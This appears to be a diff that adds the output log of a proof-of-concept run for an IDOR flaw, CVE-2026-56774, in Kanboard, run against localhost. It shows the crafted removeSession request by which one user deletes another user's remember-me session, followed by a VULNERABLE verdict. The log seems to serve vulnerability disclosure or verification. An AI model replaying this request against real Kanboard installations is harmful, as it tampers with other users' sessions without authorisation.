@@ -1,0 +1,14 @@
+== CVE-2026-56774 IDOR PoC against http://localhost:8080 ==
+[1] admin session up
+[2] alice (id 3 ) and bob (id 4 ) provisioned as app-users
+[3] bob logged in with remember-me (cookie: KB_RM)
+[4] alice logged in with remember-me (so her sessions page renders Remove links)
+[5] remember_me before: alice row 2 , bob row 1
+[6] pre-attack replay of bob's cookie -> auto-login: on / = False, on login page = False
+[7] alice's sessions page: csrf token captured; her own session ids: ['2']
+[8] CONTROL: alice removed her own session -> works
+[9] ATTACK: alice requests (her own user_id, bob's session id):
+    /?controller=UserViewController&action=removeSession&user_id=3&id=1&csrf_token=805a43978528ee74c9e50df7154ce5d7d8a7b83d6d9e10135d21e604200ae8b0
+[10] remember_me after attack: []
+[11] post-attack replay of bob's cookie -> auto-login: on / = False, on login page = False
+[VERDICT] VULNERABLE — alice deleted bob's RememberMe session with her own credentials (row removal is exactly how Kanboard invalidates the remember-me cookie on logout). Cookie replay now: auto-login: on / = False, on login page = False
